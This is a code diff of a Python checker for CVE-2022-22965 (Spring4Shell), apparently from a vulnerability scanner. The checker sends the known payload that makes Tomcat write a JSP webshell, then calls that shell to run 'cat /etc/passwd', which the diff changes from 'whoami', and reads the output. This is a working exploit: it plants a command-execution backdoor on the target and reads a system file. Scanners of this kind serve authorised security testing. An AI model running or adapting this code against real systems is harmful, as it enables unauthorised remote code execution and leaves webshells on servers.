@@ -12,19 +12,20 @@ import time
 from urllib.parse import urljoin, urlparse
 from utils.custom_headers import USER_AGENTS, TIMEOUT
 from utils.logging_config import configure_logger
+from colorama import Fore
 logger = configure_logger(__name__)
 requests.packages.urllib3.disable_warnings()
 
+CVE_ID = "CVE-2022-22965"
 
-def check(target_url, proxies=None):
+
+def check(url, dns_domain, proxies=None):
     """
     对给定的目标URL检测CVE-2022-22965漏洞。
     参数:
     - target_url: 待检测的目标URL
     - proxies: 代理配置
     """
-    CVE_ID = "CVE-2022-22965"
-
     headers = {
         "suffix": "%>//",
         "c1": "Runtime",
@@ -42,68 +43,46 @@ def check(target_url, proxies=None):
     arg_payload = "?" + "&".join([log_pattern, log_file_suffix, log_file_dir, log_file_prefix, log_file_date_format])
 
     try:
-        url_with_payload = target_url + arg_payload
+        url_with_payload = url + arg_payload
         requests.get(url_with_payload, headers=headers, verify=False, timeout=TIMEOUT, proxies=proxies)
 
         # 等待上传完成
         time.sleep(5)
 
         # 开始请求上传的webshell文件
-        shell_url = urljoin(target_url, 'tomcatwar.jsp?pwd=j&cmd=whoami')
-        shell_response = requests.get(shell_url, timeout=TIMEOUT, stream=True, verify=False, proxies=proxies)
-        if shell_response.status_code == 200:
-            logger.info(f"Detected CVE-2022-22965 vulnerability at: {shell_url}")
+        target_url = urljoin(url, 'tomcatwar.jsp?pwd=j&cmd=cat /etc/passwd')
+        res = requests.get(target_url, timeout=TIMEOUT, stream=True, verify=False, proxies=proxies)
+        logger.debug(Fore.CYAN + f"[{res.status_code}]" + Fore.BLUE + f"[{res.headers}]", extra={"target": target_url})
+        if res.status_code == 200 and "root:" in res.text:
+            logger.info(Fore.RED + f"[{CVE_ID} vulnerability detected!]", extra={"target": target_url})
             return True, {
                 "CVE_ID": CVE_ID,
-                "URL": shell_url,
-                "Details": f"检测到{CVE_ID}的RCE漏洞",
-                "Response": shell_response.text[:20] + "......"
+                "URL": target_url,
+                "Details": f"检测到{CVE_ID}的RCE漏洞"
             }
         else:
-            parsed_url = urlparse(shell_url)
+            parsed_url = urlparse(target_url)
             root_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
-            shell_url_root = urljoin(root_url, 'tomcatwar.jsp?pwd=j&cmd=whoami')
-            shell_response_root = requests.get(shell_url_root, timeout=TIMEOUT, stream=True, verify=False, proxies=proxies)
-
-            if shell_response_root.status_code == 200:
-                logger.info(f"Detected {CVE_ID} vulnerability at: {shell_url_root}")
+            target_url_root = urljoin(root_url, 'tomcatwar.jsp?pwd=j&cmd=cat /etc/passwd')
+            response_root = requests.get(target_url_root, timeout=TIMEOUT, stream=True, verify=False, proxies=proxies)
+            logger.debug(Fore.CYAN + f"[{response_root.status_code}]" + Fore.BLUE + f"[{response_root.headers}]", extra={"target": target_url_root})
+            if response_root.status_code == 200 and "root:" in response_root.text:
+                logger.info(Fore.RED + f"[{CVE_ID} vulnerability detected!]", extra={"target": target_url_root})
                 return True, {
                     "CVE_ID": CVE_ID,
-                    "URL": shell_response_root,
-                    "Details": f"检测{CVE_ID}的RCE漏洞",
-                    "Response": shell_response.text[:20] + "......"
+                    "URL": target_url_root,
+                    "Details": f"检测{CVE_ID}的RCE漏洞"
                 }
-            return False, {
-                "CVE_ID": CVE_ID,
-                "URL": target_url,
-                "Details": "未检测到CVE-2022-22965漏洞"
-            }
-    except requests.ConnectionError as e:
-        logger.error(f"URL: {target_url} 连接错误：{e}")
-        return False, {
-            "CVE_ID": CVE_ID,
-            "URL": target_url,
-            "Details": f"连接错误：{e}"
-        }
-
-    except requests.Timeout as e:
-        logger.error(f"URL: {target_url} 请求超时：{e}")
-        return False, {
-            "CVE_ID": CVE_ID,
-            "URL": target_url,
-            "Details": f"请求超时：{e}"
-        }
-
+        logger.info(f"[{CVE_ID} vulnerability not detected]", extra={"target": url})
+        return False, {}
     except requests.RequestException as e:
-        logger.error(f"URL: {target_url} 请求出错：{e}")
-        return False, {
-            "CVE_ID": CVE_ID,
-            "URL": target_url,
-            "Details": f"请求出错：{e}"
-        }
-
+        logger.debug(f"[Request Error：{e}]", extra={"target": url})
+        return False, {}
+    except Exception as e:
+        logger.error(f"[Unknown Error：{e}]", extra={"target": url})
+        return False, {}
 
 
 if __name__ == '__main__':
-    is_vul, res = check("http://localhost:8080/", proxies={})
+    is_vul, res = check("http://localhost:8080/", "", proxies={})
     print(is_vul, res)
